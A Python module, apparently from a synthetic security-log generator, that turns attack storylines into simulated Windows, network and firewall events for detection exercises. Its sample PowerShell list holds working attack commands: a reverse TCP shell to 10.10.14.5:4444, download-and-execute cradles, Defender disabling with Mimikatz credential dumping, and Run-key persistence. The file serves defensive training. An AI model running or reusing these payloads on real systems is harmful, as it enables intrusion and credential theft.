# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# SPDX-License-Identifier: MIT

"""Storyline event scheduling and execution methods.

Contains the StorylineMixin with methods for:
- Storyline event execution (single and batch)
- Typed event dispatch (logon, process, connection, etc.)
- Supplementary event emission
- Command-line output file extraction
- Encoded PowerShell generation
"""

import base64
import logging
import re
from datetime import datetime, timedelta

from evidenceforge.models.scenario import System, User
from evidenceforge.utils.rng import _get_rng
from evidenceforge.utils.time import parse_duration, parse_iso8601

logger = logging.getLogger(__name__)

# Realistic decoded PowerShell commands for base64 encoding
POWERSHELL_COMMANDS = [
    "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
    "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAA'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()",
    "Invoke-Expression (Invoke-WebRequest -Uri 'http://10.10.14.5:8080/shell.ps1' -UseBasicParsing).Content",
    "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()",
    "Set-MpPreference -DisableRealtimeMonitoring $true; Import-Module C:\\Users\\Public\\mimikatz.ps1; Invoke-Mimikatz -DumpCreds",
    "[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');$c=[Microsoft.VisualBasic.Interaction]::CallByName([type]'SEBr'+'owse','Nav' + 'igate',[Microsoft.VisualBasic.CallType]::Method,@('http://attacker.com/stage2'))",
    "Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\\Users\\Public\\data.zip','C:\\Users\\Public\\exfil')",
    "Get-ChildItem -Path C:\\Users -Recurse -Include *.docx,*.xlsx,*.pdf | Copy-Item -Destination C:\\Users\\Public\\staging",
    "Invoke-Command -ComputerName DC-01 -ScriptBlock { Get-ADUser -Filter * -Properties * | Export-Csv C:\\temp\\users.csv }",
    "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'powershell.exe -w hidden -ep bypass -f C:\\Users\\Public\\update.ps1'",
]

# ── Story process lifetime estimation ──────────────────────────────────
# Returns (min_seconds, max_seconds) or None for long-running (no termination).

_SHORT_COMMANDS: set[str] = {
    # Windows recon
    "whoami",
    "whoami.exe",
    "ipconfig",
    "ipconfig.exe",
    "hostname",
    "hostname.exe",
    "systeminfo",
    "systeminfo.exe",
    "tasklist",
    "tasklist.exe",
    "nltest",
    "nltest.exe",
    "dir",
    "type",
    "findstr",
    "findstr.exe",
    "reg",
    "reg.exe",
    "net.exe",
    "net1.exe",
    "net",
    "net1",
    "query",
    "klist",
    "klist.exe",
    "nslookup",
    "nslookup.exe",
    "netstat",
    "netstat.exe",
    "arp",
    "arp.exe",
    "route",
    "route.exe",
    "qwinsta",
    "qwinsta.exe",
    "dsquery",
    "dsquery.exe",
    # Linux recon
    "id",
    "uname",
    "ifconfig",
    "cat",
    "ls",
    "ps",
    "ss",
    "find",
    "grep",
    "awk",
    "head",
    "tail",
    "wc",
    "env",
    "printenv",
    "df",
    "mount",
    "w",
    "last",
    "ip",
    "hostnamectl",
}

_MEDIUM_COMMANDS: set[str] = {
    "powershell.exe",
    "powershell",
    "pwsh",
    "certutil",
    "certutil.exe",
    "bitsadmin",
    "bitsadmin.exe",
    "wmic",
    "wmic.exe",
    "schtasks",
    "schtasks.exe",
    "sc",
    "sc.exe",
    "mshta",
    "mshta.exe",
    "cscript",
    "cscript.exe",
    "wscript",
    "wscript.exe",
    "rundll32",
    "rundll32.exe",
    "cmd.exe",
    "cmd",  # cmd itself is medium; the inner command may be short
    "msbuild",
    "msbuild.exe",
    "regsvr32",
    "regsvr32.exe",
    # Linux attack tools
    "curl",
    "wget",
    "python",
    "python3",
    "perl",
    "ruby",
    "mysqldump",
    "pg_dump",
    "tar",
    "gzip",
    "zip",
    "scp",
}

# Patterns in command_line that indicate long-running / persistent processes
_LONG_RUNNING_PATTERNS: list[str] = [
    "TCPClient",
    "TCPListener",
    "$s.Read",
    "ncat",
    "socat",
    "nc -l",
    "nc.exe -l",
    "meterpreter",
    "beacon",
    "reverse_tcp",
    "bind_tcp",
    "-persist",
    "--keep-alive",
    "while(true)",
    "while True",
    "Start-Sleep -Seconds 99",
    "tail -f",
]

_LONG_RUNNING_EXES: set[str] = {
    "mstsc.exe",
    "mstsc",
    "rdpclip.exe",
    "rdpclip",
    "ncat",
    "ncat.exe",
    "nc",
    "nc.exe",
    "socat",
}


def _estimate_process_lifetime(process_name: str, command_line: str) -> tuple[float, float] | None:
    """Estimate how long a story process should run before terminating.

    Returns (min_seconds, max_seconds) for the termination delay,
    or None if the process should be left running (long-lived/persistent).
    """
    # Extract bare executable name
    if "\\" in process_name:
        exe = process_name.rsplit("\\", 1)[-1].lower()
    elif "/" in process_name:
        exe = process_name.rsplit("/", 1)[-1].lower()
    else:
        exe = process_name.lower()

    # Check long-running first
    if exe in _LONG_RUNNING_EXES:
        return None
    cl_lower = command_line.lower()
    for pattern in _LONG_RUNNING_PATTERNS:
        if pattern.lower() in cl_lower:
            return None

    # For cmd.exe /c, classify based on the inner command
    if exe in ("cmd.exe", "cmd") and "/c " in cl_lower:
        inner = cl_lower.split("/c ", 1)[1].strip()
        inner_exe = inner.split()[0] if inner else ""
        # Strip path from inner exe
        if "\\" in inner_exe:
            inner_exe = inner_exe.rsplit("\\", 1)[-1]
        elif "/" in inner_exe:
            inner_exe = inner_exe.rsplit("/", 1)[-1]
        if inner_exe in _SHORT_COMMANDS:
            return (0.3, 3.0)
        if inner_exe in _MEDIUM_COMMANDS:
            return (3.0, 20.0)

    if exe in _SHORT_COMMANDS:
        return (0.3, 5.0)
    if exe in _MEDIUM_COMMANDS:
        return (5.0, 30.0)

    # Default: medium-lived unknown command
    return (2.0, 15.0)


class StorylineMixin:
    """Mixin providing storyline event scheduling and execution methods."""

    def _ensure_account_sid_tracking(self) -> None:
        """Initialize the account SID tracking dict if not already present."""
        if not hasattr(self, "_created_account_sids"):
            self._created_account_sids: dict[str, str] = {}

    def _execute_storyline(self) -> None:
        """Execute storyline events (malicious/suspicious activities).

        Parses storyline events, executes them at specified times, and tracks
        them for GROUND_TRUTH.md generation. Implements baseline suppression
        (+/-5 min window) to avoid conflicts with baseline activity.

        Phase 1 Implementation:
        - Simple keyword matching for activity types
        - Basic event generation based on activity description
        - Tracking of malicious events for ground truth
        """
        total_events = len(self.scenario.storyline)
        _prev_event_time = None
        self._ensure_account_sid_tracking()

        for event_num, storyline_event in enumerate(self.scenario.storyline, start=1):
            event_time = self._parse_storyline_time(storyline_event.time)
            rng = _get_rng()
            jitter = timedelta(
                seconds=rng.uniform(-30, 30),
                microseconds=rng.randint(0, 999999),
            )
            event_time = event_time + jitter
            if _prev_event_time and event_time <= _prev_event_time:
                event_time = _prev_event_time + timedelta(milliseconds=rng.randint(100, 5000))
            _prev_event_time = event_time

            actor = self._find_actor(storyline_event.actor)
            system = self._find_system(storyline_event.system)

            if not actor or not system:
                logger.warning(
                    f"Skipping storyline event: actor={storyline_event.actor}, "
                    f"system={storyline_event.system} not found"
                )
                continue

            logger.info(
                f"Executing storyline event: {storyline_event.actor} on "
                f"{storyline_event.system} at {event_time}"
            )

            self._report_progress(
                "storyline_progress",
                {
                    "event_num": event_num,
                    "total_events": total_events,
                    "actor": actor.username,
                    "system": system.hostname,
                },
            )

            self.state_manager.set_current_time(event_time)
            explicit_types = {spec.type for spec in storyline_event.events}

            # Apply human typing cadence: space events in a step with
            # realistic inter-action delays instead of shared timestamps
            from evidenceforge.utils.timing import typing_cadence

            cadence_offsets = typing_cadence(len(storyline_event.events), rng)

            for i, spec in enumerate(storyline_event.events):
                event_t = event_time + timedelta(seconds=cadence_offsets[i])
                self.state_manager.set_current_time(event_t)
                malicious_event = self._execute_typed_event(
                    spec=spec,
                    actor=actor,
                    system=system,
                    time=event_t,
                    activity=storyline_event.activity,
                    explicit_types=explicit_types,
                )
                if malicious_event:
                    self.malicious_events.append(malicious_event)

            self._barrier_flush_all_emitters()

    def _execute_single_storyline_event(self, event_idx: int) -> None:
        """Execute a single storyline event by index (used for interleaved generation)."""
        self._ensure_account_sid_tracking()
        storyline_event = self.scenario.storyline[event_idx]
        event_idx + 1

        event_time = self._parse_storyline_time(storyline_event.time)
        rng = _get_rng()
        jitter = timedelta(
            seconds=rng.uniform(-30, 30),
            microseconds=rng.randint(0, 999999),
        )
        event_time = event_time + jitter

        actor = self._find_actor(storyline_event.actor)
        system = self._find_system(storyline_event.system)
        if not actor or not system:
            return

        logger.info(
            f"Executing interleaved storyline event: {storyline_event.actor} on {storyline_event.system} at {event_time}"
        )

        self.state_manager.set_current_time(event_time)

        explicit_types = {spec.type for spec in storyline_event.events}

        # Apply human typing cadence for intra-step event spacing
        from evidenceforge.utils.timing import typing_cadence

        cadence_offsets = typing_cadence(len(storyline_event.events), rng)

        for i, spec in enumerate(storyline_event.events):
            event_t = event_time + timedelta(seconds=cadence_offsets[i])
            self.state_manager.set_current_time(event_t)
            malicious_event = self._execute_typed_event(
                spec=spec,
                actor=actor,
                system=system,
                time=event_t,
                activity=storyline_event.activity,
                explicit_types=explicit_types,
            )
            if malicious_event:
                self.malicious_events.append(malicious_event)

    def _execute_single_red_herring_event(self, event_idx: int) -> None:
        """Execute a single red herring event by index.

        Uses the same event execution path as storyline events but tracks
        results in red_herring_events instead of malicious_events.
        """
        self._ensure_account_sid_tracking()
        rh_event = self.scenario.red_herrings[event_idx]

        event_time = self._parse_storyline_time(rh_event.time)
        rng = _get_rng()
        jitter = timedelta(
            seconds=rng.uniform(-30, 30),
            microseconds=rng.randint(0, 999999),
        )
        event_time = event_time + jitter

        actor = self._find_actor(rh_event.actor)
        system = self._find_system(rh_event.system)
        if not actor or not system:
            return

        logger.info(
            f"Executing red herring event: {rh_event.actor} on {rh_event.system} at {event_time}"
        )

        self.state_manager.set_current_time(event_time)

        explicit_types = {spec.type for spec in rh_event.events}

        # Apply typing cadence so logon events precede process events
        # within compound red herring steps (same as storyline events)
        from evidenceforge.utils.timing import typing_cadence

        cadence_offsets = typing_cadence(len(rh_event.events), rng)

        for i, spec in enumerate(rh_event.events):
            event_t = event_time + timedelta(seconds=cadence_offsets[i])
            self.state_manager.set_current_time(event_t)
            result = self._execute_typed_event(
                spec=spec,
                actor=actor,
                system=system,
                time=event_t,
                activity=rh_event.activity,
                explicit_types=explicit_types,
            )
            if result:
                # Track as red herring, not malicious
                result["explanation"] = rh_event.explanation
                self.red_herring_events.append(result)

    def _execute_typed_event(
        self,
        spec,  # EventSpec union type
        actor: User,
        system: System,
        time: datetime,
        activity: str,
        explicit_types: set[str],
    ) -> dict | None:
        """Execute a single typed event from the storyline events list.

        Each event spec type maps to a specific generate_* method on ActivityGenerator.
        Returns a malicious_event dict for GROUND_TRUTH.md.
        """
        rng = _get_rng()
        malicious_event = {
            "time": time,
            "actor": actor.username,
            "system": system.hostname,
            "activity": activity,
            "type": spec.type,
        }

        if spec.type == "logon":
            _attacker_ips = [
                "45.33.32.156",
                "185.220.101.34",
                "91.219.236.174",
                "23.129.64.210",
                "116.202.120.181",
            ]
            source_ip = spec.source_ip or rng.choice(_attacker_ips)
            logon_id = self.activity_generator.generate_logon(
                user=actor,
                system=system,
                time=time,
                logon_type=spec.logon_type,
                source_ip=source_ip,
            )
            malicious_event["logon_id"] = logon_id
            malicious_event["source_ip"] = source_ip

        elif spec.type == "failed_logon":
            _attacker_ips = ["45.33.32.156", "185.220.101.34", "91.219.236.174"]
            source_ip = spec.source_ip or rng.choice(_attacker_ips)
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                None,
            )
            self.activity_generator.generate_failed_logon(
                user=actor,
                system=system,
                time=time,
                logon_type=spec.logon_type,
                source_ip=source_ip,
                target_username=getattr(spec, "target_username", None),
                dc_system=dc,
            )
            malicious_event["source_ip"] = source_ip

        elif spec.type == "logoff":
            sessions = self.state_manager.get_sessions_for_user(actor.username)
            target_session = next((s for s in sessions if s.system == system.hostname), None)
            if target_session:
                self.activity_generator.generate_logoff(
                    actor, system, time, target_session.logon_id
                )

        elif spec.type == "process":
            sessions = self.state_manager.get_sessions_for_user(actor.username)
            target_session = next((s for s in sessions if s.system == system.hostname), None)
            if not target_session:
                logon_time = time - timedelta(seconds=rng.uniform(0.5, 2.0))
                logon_id = self.activity_generator.generate_logon(
                    actor, system, logon_time, logon_type=3
                )
            else:
                logon_id = target_session.logon_id

            from evidenceforge.generation.activity import _get_os_category

            os_category = _get_os_category(system.os)
            process_name = spec.process_name
            command_line = spec.command_line or process_name

            if os_category == "linux":
                self.activity_generator.generate_bash_command(actor, system, time, command_line)

            if "<base64_encoded_command>" in command_line:
                command_line = command_line.replace(
                    "<base64_encoded_command>",
                    self._generate_encoded_powershell(hash(f"{time}_{actor.username}")),
                )

            parent_pid = self.activity_generator._select_parent_pid(system, actor, process_name)
            pid = self.activity_generator.generate_process(
                user=actor,
                system=system,
                time=time,
                logon_id=logon_id,
                process_name=process_name,
                command_line=command_line,
                parent_pid=parent_pid,
                ensure_file_event=True,
            )
            self.activity_generator._record_user_process(system, actor, pid, process_name)
            self._last_storyline_pid = pid
            self._last_storyline_image = process_name
            self._last_storyline_system = system.hostname
            malicious_event["process_name"] = process_name
            malicious_event["command_line"] = command_line
            malicious_event["pid"] = pid

            output_file = self._extract_output_file(command_line, os_category)
            if output_file:
                file_time = time + timedelta(seconds=rng.uniform(0.5, 3.0))
                from evidenceforge.events.base import SecurityEvent
                from evidenceforge.events.contexts import AuthContext, FileContext

                host_ctx = self.activity_generator._build_host_context(system)
                self.dispatcher.dispatch(
                    SecurityEvent(
                        timestamp=file_time,
                        event_type="file_create",
                        src_host=host_ctx,
                        auth=AuthContext(username=actor.username),
                        file=FileContext(path=output_file, action="create", pid=pid),
                    )
                )
                malicious_event["output_file"] = output_file

            _EXPLICIT_CRED_TOOLS = {"psexec", "wmic", "runas", "schtasks", "net.exe", "net1.exe"}
            proc_basename = (
                process_name.rsplit("\\", 1)[-1].lower()
                if "\\" in process_name
                else process_name.lower()
            )
            if proc_basename in _EXPLICIT_CRED_TOOLS and os_category == "windows":
                cred_time = time - timedelta(milliseconds=rng.randint(5, 50))
                self.activity_generator.generate_explicit_credentials(
                    user=actor,
                    system=system,
                    time=cred_time,
                    target_username=actor.username,
                    target_server="localhost",
                    process_name=process_name,
                    process_pid=pid,
                )

            if os_category == "windows" and getattr(spec, "supplementary", "auto") != "none":
                self.activity_generator._expand_and_emit(
                    "process_create",
                    time,
                    actor=actor,
                    target_system=system,
                    command_line=command_line,
                    os_category=os_category,
                    skip_types=explicit_types,
                )

            # Mark as story process and schedule termination
            self.state_manager.mark_story_process(system.hostname, pid)
            lifetime = _estimate_process_lifetime(process_name, command_line)
            if lifetime is not None:
                term_delay = rng.uniform(lifetime[0], lifetime[1])
                term_time = time + timedelta(seconds=term_delay)
                self.activity_generator.generate_process_termination(
                    user=actor,
                    system=system,
                    time=term_time,
                    pid=pid,
                    process_name=process_name,
                    logon_id=logon_id,
                )
                self.state_manager.end_process(system.hostname, pid)

        elif spec.type == "connection":
            _c2_ips = ["159.65.43.201", "134.209.29.115", "167.71.156.88"]
            source_ip = spec.source_ip or system.ip
            dst_ip = spec.dst_ip
            dst_port = spec.dst_port
            service = spec.service or (
                "ssl" if dst_port == 443 else "http" if dst_port == 80 else "ssl"
            )
            # Build HttpContext if HTTP fields are provided
            http_ctx = None
            if spec.method or spec.uri:
                from evidenceforge.events.contexts import HttpContext

                resp_bytes = rng.randint(5000, 50000)
                http_ctx = HttpContext(
                    method=spec.method or "GET",
                    host=dst_ip,
                    uri=spec.uri or "/",
                    version="1.1",
                    user_agent=spec.user_agent or "Mozilla/5.0",
                    request_body_len=rng.randint(0, 500) if spec.method == "POST" else 0,
                    response_body_len=resp_bytes,
                    status_code=spec.status_code or 200,
                    status_msg={
                        200: "OK",
                        301: "Moved Permanently",
                        302: "Found",
                        403: "Forbidden",
                        404: "Not Found",
                        500: "Internal Server Error",
                    }.get(spec.status_code or 200, "OK"),
                    resp_mime_types=["text/html"] if (spec.status_code or 200) == 200 else [],
                    tags=[],
                )

            # Resolve source system from source_ip (not storyline system, which may be the target)
            src_sys = None
            ip_map = getattr(self.activity_generator, "_ip_to_system", {})
            if source_ip in ip_map:
                src_sys = ip_map[source_ip]
            elif source_ip == system.ip:
                src_sys = system
            uid = self.activity_generator.generate_connection(
                src_ip=source_ip,
                dst_ip=dst_ip,
                time=time,
                dst_port=dst_port,
                service=service,
                duration=rng.uniform(1.0, 30.0),
                orig_bytes=rng.randint(1000, 10000),
                resp_bytes=rng.randint(5000, 50000),
                emit_dns=True,
                source_system=src_sys,
                http=http_ctx,
                pid=getattr(self, "_last_storyline_pid", -1) or -1,
            )
            malicious_event["dst_ip"] = dst_ip
            malicious_event["dst_port"] = dst_port
            malicious_event["uid"] = uid if uid else "(filtered by sensor placement)"

        elif spec.type == "ssh_session":
            source_ip = spec.source_ip or system.ip
            target = next(
                (s for s in self.scenario.environment.systems if s.ip == system.ip), system
            )
            uid = self.activity_generator.generate_ssh_session(
                user=actor,
                target_system=target,
                time=time,
                source_ip=source_ip,
            )
            malicious_event["dst_ip"] = system.ip
            malicious_event["dst_port"] = 22
            malicious_event["uid"] = uid if uid else "(filtered by sensor placement)"

        elif spec.type == "rdp_session":
            source_ip = spec.source_ip or system.ip
            target = next(
                (s for s in self.scenario.environment.systems if s.ip == system.ip), system
            )
            uid = self.activity_generator.generate_rdp_session(
                user=actor,
                target_system=target,
                time=time,
                source_ip=source_ip,
            )
            malicious_event["dst_ip"] = system.ip
            malicious_event["dst_port"] = 3389
            malicious_event["uid"] = uid if uid else "(filtered by sensor placement)"

        elif spec.type == "account_created":
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                system,
            )
            target_sid = spec.target_sid or self._make_domain_sid()
            self.activity_generator.generate_account_created(
                actor=actor,
                system=dc,
                time=time,
                target_username=spec.target_username,
                target_sid=target_sid,
            )
            # Store SID for later reuse by group_member_added
            self._created_account_sids[spec.target_username] = target_sid
            malicious_event["target_username"] = spec.target_username

        elif spec.type == "account_deleted":
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                system,
            )
            target_sid = spec.target_sid or self._make_domain_sid()
            self.activity_generator.generate_account_deleted(
                actor=actor,
                system=dc,
                time=time,
                target_username=spec.target_username,
                target_sid=target_sid,
            )
            malicious_event["target_username"] = spec.target_username

        elif spec.type == "group_member_added":
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                system,
            )
            group_rid = 512 if "admin" in spec.group_name.lower() else rng.randint(1100, 9999)
            group_sid = self._make_domain_sid(group_rid)
            # Reuse SID from earlier account_created event, or generate new
            member_sid = (
                self._created_account_sids.get(spec.member_name)
                or self.activity_generator.sid_registry.get(spec.member_name)
                or self._make_domain_sid()
            )
            self.activity_generator.generate_group_membership_change(
                actor=actor,
                system=dc,
                time=time,
                action="add",
                scope=spec.scope,
                group_name=spec.group_name,
                group_sid=group_sid,
                member_username=spec.member_name,
                member_sid=member_sid,
            )
            malicious_event["group_name"] = spec.group_name
            malicious_event["member_name"] = spec.member_name

        elif spec.type == "service_installed":
            self.activity_generator.generate_service_installed(
                user=actor,
                system=system,
                time=time,
                service_name=spec.service_name,
                service_file_name=spec.service_file_name,
                service_account=spec.service_account,
            )
            malicious_event["service_name"] = spec.service_name
            if spec.service_file_name:
                malicious_event["service_file_name"] = spec.service_file_name

        elif spec.type == "scheduled_task_created":
            task_content = spec.task_content
            if not task_content:
                # Generate realistic XML task content from the task name
                task_content = (
                    f'<?xml version="1.0" encoding="UTF-16"?>\n'
                    f'<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\n'
                    f'  <Actions Context="Author">\n'
                    f"    <Exec>\n"
                    f"      <Command>C:\\Windows\\System32\\cmd.exe</Command>\n"
                    f'      <Arguments>/c "{spec.task_name}"</Arguments>\n'
                    f"    </Exec>\n"
                    f"  </Actions>\n"
                    f"</Task>"
                )
            self.activity_generator.generate_scheduled_task(
                user=actor,
                system=system,
                time=time,
                task_name=spec.task_name,
                action="created",
                task_content=task_content,
            )
            malicious_event["task_name"] = spec.task_name
            malicious_event["task_content"] = task_content

        elif spec.type == "log_cleared":
            self.activity_generator.generate_log_cleared(user=actor, system=system, time=time)

        elif spec.type == "create_remote_thread":
            source_pid = getattr(self, "_last_storyline_pid", 0) or 0
            source_image = getattr(self, "_last_storyline_image", "") or "unknown"
            # Use a realistic target PID — look up the process name from
            # system PIDs or use a plausible default (not 4 = System kernel)
            target_name = spec.target_process.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
            target_pid = self.activity_generator._get_system_pid(
                system.hostname,
                target_name.replace(".exe", ""),
                0x27C,  # 636 default
            )
            self.activity_generator.generate_create_remote_thread(
                user=actor,
                system=system,
                time=time,
                source_pid=source_pid,
                source_image=source_image,
                target_pid=target_pid,
                target_image=spec.target_process,
            )
            # Emit ProcessAccess via causal expansion engine (or legacy fallback)
            # when targeting lsass.exe — primary credential-dumping detection signal
            if "lsass" in target_name:
                self.activity_generator._expand_and_emit(
                    "create_remote_thread",
                    time,
                    actor=actor,
                    target_system=system,
                    source_pid=source_pid,
                    source_image=source_image,
                    target_pid=target_pid,
                    target_image=spec.target_process,
                )
            malicious_event["target_process"] = spec.target_process

        elif spec.type == "dhcp_lease":
            ip_hash = hash(f"mac_{spec.requested_ip or system.ip}")
            mac = spec.mac_address or (
                f"00:50:56:{(ip_hash >> 16) & 0xFF:02x}"
                f":{(ip_hash >> 8) & 0xFF:02x}:{ip_hash & 0xFF:02x}"
            )
            from evidenceforge.utils.ids import generate_zeek_uid

            self.activity_generator.generate_dhcp_lease(
                system=system,
                time=time,
                mac=mac,
                lease_time=float(rng.choice([3600, 7200, 14400, 86400])),
                uid=generate_zeek_uid("C"),
            )
            malicious_event["mac_address"] = mac

        elif spec.type == "port_scan":
            import ipaddress

            # Resolve target IPs
            if spec.target_ips:
                resolved_targets = list(spec.target_ips)
            elif spec.target_segment and self.scenario.environment.network:
                seg = next(
                    (
                        s
                        for s in self.scenario.environment.network.segments
                        if s.name == spec.target_segment
                    ),
                    None,
                )
                if seg:
                    net = ipaddress.ip_network(seg.cidr, strict=False)
                    all_hosts = [str(h) for h in net.hosts()]
                    count = min(spec.target_count, len(all_hosts))
                    resolved_targets = rng.sample(all_hosts, count)
                else:
                    resolved_targets = []
            else:
                resolved_targets = []

            # Determine conn_state from firewall drop_mode
            conn_state = self._get_firewall_deny_conn_state()

            # Resolve interfaces
            src_iface = self._resolve_firewall_interface(system.ip)

            # Generate deny connections: targets × ports
            spacing = 1.0 / spec.scan_rate
            total_count = 0
            for target_ip in resolved_targets:
                dst_iface = self._resolve_firewall_interface(target_ip)
                for port in spec.ports:
                    jitter_offset = rng.uniform(-spacing * 0.2, spacing * 0.2)
                    scan_time = time + timedelta(seconds=total_count * spacing + jitter_offset)
                    self.state_manager.set_current_time(scan_time)

                    from evidenceforge.events.contexts import FirewallContext

                    self.activity_generator.generate_connection(
                        src_ip=system.ip,
                        dst_ip=target_ip,
                        time=scan_time,
                        dst_port=port,
                        proto=spec.protocol,
                        conn_state=conn_state,
                        firewall=FirewallContext(
                            action="deny",
                            msg_id=106023,
                            connection_id=0,
                            src_interface=src_iface,
                            dst_interface=dst_iface,
                            access_group=f"{src_iface}_access_in",
                        ),
                        emit_dns=False,
                    )
                    total_count += 1

            malicious_event["target_count"] = len(resolved_targets)
            malicious_event["ports"] = spec.ports
            malicious_event["total_connections"] = total_count
            malicious_event["protocol"] = spec.protocol

        elif spec.type == "blocked_c2":
            interval_td = parse_duration(spec.interval)
            duration_td = parse_duration(spec.duration)
            interval_sec = interval_td.total_seconds()
            duration_sec = duration_td.total_seconds()

            # Determine conn_state from firewall drop_mode
            conn_state = self._get_firewall_deny_conn_state()

            # Resolve interfaces
            src_iface = self._resolve_firewall_interface(system.ip)
            dst_iface = self._resolve_firewall_interface(spec.dst_ip)

            # Generate periodic denied attempts
            from evidenceforge.events.contexts import FirewallContext

            attempt_count = 0
            t = 0.0
            while t <= duration_sec:
                jitter_offset = rng.uniform(-spec.jitter * interval_sec, spec.jitter * interval_sec)
                attempt_time = time + timedelta(seconds=max(0.0, t + jitter_offset))
                self.state_manager.set_current_time(attempt_time)

                self.activity_generator.generate_connection(
                    src_ip=system.ip,
                    dst_ip=spec.dst_ip,
                    time=attempt_time,
                    dst_port=spec.dst_port,
                    proto=spec.protocol,
                    conn_state=conn_state,
                    firewall=FirewallContext(
                        action="deny",
                        msg_id=106023,
                        connection_id=0,
                        src_interface=src_iface,
                        dst_interface=dst_iface,
                        access_group=f"{src_iface}_access_in",
                    ),
                    emit_dns=False,
                )
                attempt_count += 1
                t += interval_sec

            malicious_event["dst_ip"] = spec.dst_ip
            malicious_event["dst_port"] = spec.dst_port
            malicious_event["interval"] = spec.interval
            malicious_event["duration"] = spec.duration
            malicious_event["attempt_count"] = attempt_count

        elif spec.type == "raw":
            self.activity_generator.generate_raw(
                time=time,
                target_format=spec.target_format,
                fields=spec.fields,
                system=system,
            )
            malicious_event["target_format"] = spec.target_format

        return malicious_event

    def _resolve_firewall_interface(self, ip: str) -> str:
        """Resolve an IP to a firewall interface name using scenario network config."""
        import ipaddress as _ipaddress

        if not self.scenario.environment.network:
            return "outside"
        fw_sensor = next(
            (s for s in self.scenario.environment.network.sensors if s.type == "firewall"),
            None,
        )
        interfaces = fw_sensor.interfaces if fw_sensor else {}
        for seg in self.scenario.environment.network.segments:
            try:
                if _ipaddress.ip_address(ip) in _ipaddress.ip_network(seg.cidr, strict=False):
                    return interfaces.get(seg.name, seg.name)
            except (ValueError, KeyError):
                continue
        return interfaces.get("_default", "outside")

    def _get_firewall_deny_conn_state(self) -> str:
        """Get the conn_state for denied connections based on firewall drop_mode."""
        if not self.scenario.environment.network:
            return "S0"
        fw_sensor = next(
            (s for s in self.scenario.environment.network.sensors if s.type == "firewall"),
            None,
        )
        if fw_sensor and fw_sensor.drop_mode == "reject":
            return "REJ"
        return "S0"

    @staticmethod
    def _extract_output_file(command_line: str, os_category: str) -> str | None:
        """Extract output file path from a command line string.

        Detects common output file patterns in PowerShell, cmd, and Linux commands.
        Returns the file path if found, None otherwise.
        """
        patterns = [
            r'Export-Csv\s+[\'"]?([^\s\'">;]+)',  # PowerShell Export-Csv
            r'-OutFile\s+[\'"]?([^\s\'">;]+)',  # PowerShell -OutFile
            r'Out-File\s+[\'"]?([^\s\'">;]+)',  # PowerShell Out-File
            r'>\s*[\'"]?([^\s\'">;]+)',  # Shell redirect >
            r'-o\s+[\'"]?([^\s\'">;]+)',  # Common -o flag
            r'--output[= ]\s*[\'"]?([^\s\'">;]+)',  # --output flag
        ]
        for pattern in patterns:
            match = re.search(pattern, command_line, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def _parse_storyline_time(self, time_str: str) -> datetime:
        """Parse storyline event time to absolute datetime.

        Supports:
        - ISO 8601 absolute time: "2024-01-15T10:30:00Z"
        - Relative offset (duration): "+2h30m"
        - Relative offset (seconds): "+7200"

        Args:
            time_str: Time string to parse

        Returns:
            Absolute datetime (UTC)

        Raises:
            ValueError: If time format is invalid
        """
        if time_str[0].isdigit() and len(time_str) > 10:
            return parse_iso8601(time_str)

        if time_str.startswith("+"):
            offset_str = time_str[1:]
            if offset_str.isdigit():
                offset = timedelta(seconds=int(offset_str))
            else:
                offset = parse_duration(offset_str)
            return self.start_time + offset

        raise ValueError(f"Invalid storyline time format: {time_str}")

    def _make_domain_sid(self, rid: int | None = None) -> str:
        """Generate a SID using the scenario's domain SID prefix."""
        rng = _get_rng()
        for sid in self.activity_generator.sid_registry.values():
            if sid.startswith("S-1-5-21-") and sid.count("-") == 7:
                prefix = "-".join(sid.split("-")[:7])
                return f"{prefix}-{rid or rng.randint(1100, 9999)}"
        return f"S-1-5-21-{rng.randint(100000000, 999999999)}-{rng.randint(100000000, 999999999)}-{rng.randint(100000000, 999999999)}-{rid or rng.randint(1100, 9999)}"

    def _generate_encoded_powershell(self, seed: int) -> str:
        """Generate a realistic base64-encoded PowerShell command.

